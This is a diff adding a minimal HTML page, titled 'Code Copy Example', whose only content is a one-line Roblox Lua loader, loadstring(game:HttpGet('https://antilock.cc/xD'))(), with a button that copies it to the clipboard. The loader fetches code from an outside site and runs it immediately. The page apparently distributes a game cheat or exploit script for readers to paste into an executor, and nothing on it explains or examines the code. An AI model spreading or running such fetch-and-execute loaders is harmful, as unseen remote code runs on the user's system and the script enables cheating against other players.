@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Code Copy Example</title>
+<style>
+  body {
+    background-color: #302c34;
+    color: white;
+    font-family: Arial, sans-serif;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    margin: 0;
+  }
+  .code-container {
+    background-color: #302c34;
+    padding: 20px;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(255, 255, 255, 0.1);
+    text-align: center;
+  }
+  .code {
+    font-family: monospace;
+    white-space: pre;
+  }
+  .copy-button {
+    margin-top: 10px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 5px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
+<div class="code-container">
+  <div class="code">
+loadstring(game:HttpGet('https://antilock.cc/xD'))()
+  </div>
+  <button class="copy-button" onclick="copyCode()">Copy</button>
+</div>
+<script>
+  function copyCode() {
+    const codeText = document.querySelector('.code').innerText;
+    const tempTextArea = document.createElement('textarea');
+    tempTextArea.value = codeText;
+    document.body.appendChild(tempTextArea);
+    tempTextArea.select();
+    document.execCommand('copy');
+    document.body.removeChild(tempTextArea);
+    alert('Code copied to clipboard!');
+  }
+</script>
+</body>
+</html>
